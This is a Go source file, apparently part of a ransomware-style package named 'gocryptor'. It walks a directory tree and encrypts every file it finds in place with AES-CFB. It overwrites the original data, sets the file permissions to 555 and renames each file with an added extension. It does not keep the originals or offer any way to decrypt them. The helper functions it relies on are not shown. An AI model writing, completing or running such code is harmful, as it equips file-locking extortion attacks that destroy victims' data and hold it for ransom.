package gocryptor

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"os"
)

func EncryptDir(root string, key string) error {
	files, err := enumFiles(root)

	for _, file := range files {
		fmt.Println(os.Args[0] + file)
		err = EncryptFile(file, key)
		if err != nil {
			return err
		}
	}
	return nil
}

func EncryptFile(filename string, key string) error {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return err
	}

	data, err = AESencode(data, key)
	if err != nil {
		return err
	}

	err = ioutil.WriteFile(filename, data, 555)
	if err != nil {
		return err
	}
	os.Rename(filename, filename+newExtention)
	return nil
}

func AESencode(data []byte, key string) ([]byte, error) {
	keyByte := []byte(key)
	block, err := aes.NewCipher(keyByte)
	if err != nil {
		return nil, err
	}

	cipherData := make([]byte, aes.BlockSize+len(data))
	initVec := cipherData[:aes.BlockSize]
	_, err = io.ReadFull(rand.Reader, initVec)
	if err != nil {
		return nil, err
	}

	stream := cipher.NewCFBEncrypter(block, initVec)
	stream.XORKeyStream(cipherData[aes.BlockSize:], data)
	return cipherData, nil
}
